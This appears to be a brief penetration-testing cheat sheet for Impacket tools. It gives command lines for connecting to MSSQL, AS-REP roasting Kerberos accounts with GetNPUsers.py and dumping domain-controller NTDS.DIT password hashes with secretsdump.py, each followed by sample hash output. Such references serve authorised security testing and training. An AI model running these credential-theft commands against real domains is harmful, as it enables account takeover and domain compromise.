<a href="https://github.com/SecureAuthCorp/impacket/releases/">Impacket</a>

# mssqlclient.py
```
mssqlclient.py OPTIONALHOSTNAME/user@x.x.x.x -windows-auth

An MSSQL client
```

# GetNPUsers.py
```
GetNPUsers.py domain.com/ -dc-ip x.x.x.x -request

Name MemberOf PasswordLastSet LastLogon UAC
$krb5asrep$23$user@domain.com:Ticket
```

# secretsdump.py
```
secretsdump.py domain.com/user:password@dc.domain.com

DC sync to dump NTDS.DIT secrets
User:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
```